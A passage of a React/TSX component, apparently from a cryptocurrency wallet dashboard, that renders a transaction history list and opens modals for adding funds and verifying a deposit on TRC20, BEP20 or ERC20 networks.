                    <div style={{ width: 28, height: 28, borderRadius: 8, background: tx.type === 'credit' ? 'rgba(0,229,160,0.1)' : 'rgba(248,113,113,0.1)', border: `1px solid ${tx.type === 'credit' ? 'rgba(0,229,160,0.2)' : 'rgba(248,113,113,0.2)'}`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                      <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                        {tx.type === 'credit'
                          ? <path d="M6 2V10M2 6L6 10L10 6" stroke="#00E5A0" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>
                          : <path d="M6 10V2M2 6L6 2L10 6" stroke="#F87171" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>}
                      </svg>
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <p style={{ fontSize: 12, fontWeight: 700, color: '#fff', margin: 0 }}>{tx.note || (tx.type === 'credit' ? 'Funds added' : 'Funds deducted')}</p>
                      <p style={{ fontSize: 10, color: 'rgba(255,255,255,0.3)', margin: '2px 0 0' }}>
                        {new Date(tx.createdAt).toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' })}
                      </p>
                    </div>
                    <span style={{ fontSize: 13, fontWeight: 800, color: tx.type === 'credit' ? '#00E5A0' : '#F87171', fontFamily: 'monospace', flexShrink: 0 }}>
                      {tx.type === 'credit' ? '+' : '−'}{tx.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        <style>{`
          @keyframes spin{to{transform:rotate(360deg)}}
          @keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
        `}</style>
      </div>

      {/* Add Funds modal */}
      {fundsWallet && (() => {
        const chainId = fundsWallet.chainId;
        const netKey: Network = chainId === 195 ? 'TRC20' : chainId === 56 ? 'BEP20' : 'ERC20';
        const net = NETWORKS.find(n => n.key === netKey);
        if (!net) return null;
        return (
          <AddFundsModal
            wallet={fundsWallet}
            network={net.key}
            color={net.color}
            label={net.label}
            onClose={() => setFundsWallet(null)}
          />
        );
      })()}

      {/* Verify modal — mobile: bottom sheet + TW deep link button; desktop: centered + QR */}
      {activeNet && (
        <MobileVerifyModal
          network={activeNet.key}
          color={activeNet.color}
          label={activeNet.label}
          chain={activeNet.chain}
          depositAddress={depositAddresses[activeNet.key] ?? ''}
          onVerified={(addr, txHash) => handleVerified(activeNet.key, addr, txHash)}
          onClose={() => setModalNet(null)}
          isDesktop={!isMobile}
        />
      )}
    </ClientShell>
  );
}
